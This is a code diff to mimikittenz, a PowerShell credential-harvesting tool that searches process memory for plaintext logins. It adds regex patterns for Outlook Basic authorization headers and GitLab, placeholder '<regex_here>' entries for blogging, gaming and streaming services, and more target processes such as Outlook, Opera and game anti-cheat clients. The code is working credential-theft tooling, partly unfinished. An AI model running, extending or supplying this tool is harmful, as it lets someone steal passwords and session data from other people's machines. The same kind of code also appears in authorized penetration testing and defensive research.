@@ -454,6 +454,12 @@ Add-Type -TypeDefinition $Source2 -Language CSharp -CompilerParameters $inmem
     [mimikittenz.MemProcInspector]::AddRegex("Gmail","&Email=.{1,99}?&Passwd=.{1,99}?&PersistentCookie=")
 
 
+# Desktop Email
+	
+    # Outlook
+    [mimikittenz.MemProcInspector]::AddRegex("Outlook","Authorization: Basic .{1,100}")
+
+
 #Web Services
 
     #Dropbox
@@ -481,6 +487,7 @@ Add-Type -TypeDefinition $Source2 -Language CSharp -CompilerParameters $inmem
     [mimikittenz.MemProcInspector]::AddRegex("Xero ","fragment=&userName=.{1,32}&password=.{1,22}&__RequestVerificationToken=")
     #MYOB
     [mimikittenz.MemProcInspector]::AddRegex("MYOB","UserName=.{1,50}&Password=.{1,50}&RememberMe=")
+
 #SSL-VPN's
 
     #Juniper SSL-VPN
@@ -495,6 +502,21 @@ Add-Type -TypeDefinition $Source2 -Language CSharp -CompilerParameters $inmem
     [mimikittenz.MemProcInspector]::AddRegex("Facebook","lsd=.{1,10}&email=.{1,42}&pass=.{1,22}&default_persistent=")
     #LinkedIN
     [mimikittenz.MemProcInspector]::AddRegex("LinkedIN","session_key=.{1,50}&session_password=.{1,50}&isJsEnabled")
+    
+
+#Blogging Sites
+    #WordPress
+    [mimikittenz.MemProcInspector]::AddRegex("WordPress","<regex_here>")
+    #Joomla
+    [mimikittenz.MemProcInspector]::AddRegex("Joomla","<regex_here>")
+    #Drupal
+    [mimikittenz.MemProcInspector]::AddRegex("Drupal","<regex_here>")
+    #Blogger
+    [mimikittenz.MemProcInspector]::AddRegex("Blogger","<regex_here>")
+    #Magento
+    [mimikittenz.MemProcInspector]::AddRegex("Magento","<regex_here>")
+    #Blogg.no
+    [mimikittenz.MemProcInspector]::AddRegex("Blogg.no","<regex_here>")    
 
 #Anti-Forensics
 
@@ -522,14 +544,35 @@ Add-Type -TypeDefinition $Source2 -Language CSharp -CompilerParameters $inmem
     [mimikittenz.MemProcInspector]::AddRegex("Redmine","username=.{1,50}&password=.{1,50}&login=Login")
     #Github
     [mimikittenz.MemProcInspector]::AddRegex("Github","%3D%3D&login=.{1,50}&password=.{1,50}")
+    #Gitlab?
+    [mimikittenz.MemProcInspector]::AddRegex("Gitlab","%3D%3D&login=.{1,50}&password=.{1,50}")
     #Bugzilla
     [mimikittenz.MemProcInspector]::AddRegex("BugZilla","Bugzilla_login=.{1,50}&Bugzilla_password=.{1,50}")
     #Zendesk
     [mimikittenz.MemProcInspector]::AddRegex("Zendesk","user%5Bemail%5D=.{1,50}&user%5Bpassword%5D=.{1,50}")
     #Cpanel
     [mimikittenz.MemProcInspector]::AddRegex("Cpanel","user=.{1,50}&pass=.{1,50}")
-[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($asciiart))
-$matchesFound=[mimikittenz.MemProcInspector]::InspectManyProcs("iexplore","chrome","firefox")
+    
 
+#Password Management Solutions
+    #KeePass
+    #LastPass
+    #Password Safe
+    
+
+#Gaming Related Apps
+
+    #Faceit Anti-Cheat
+    [mimikittenz.MemProcInspector]::AddRegex("FACEIT Client","<regex_here>")
+    #ESEA Client
+    [mimikittenz.MemProcInspector]::AddRegex("ESEA Client","<regex_here>")
+    #Plays.tv Video Recorder
+    [mimikittenz.MemProcInspector]::AddRegex("Plays.tv Client","<regex_here>")
+    #Twitch TV
+    [mimikittenz.MemProcInspector]::AddRegex("Twitch.tv","<regex_here>")
+    #Hitbox.TV
+    [mimikittenz.MemProcInspector]::AddRegex("Hitbox.tv","<regex_here>")
+[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($asciiart))
+$matchesFound=[mimikittenz.MemProcInspector]::InspectManyProcs("iexplore","chrome","firefox","opera","outlook","faceitclient","eseaclient","playstv")
 write-output $matchesFound
 }
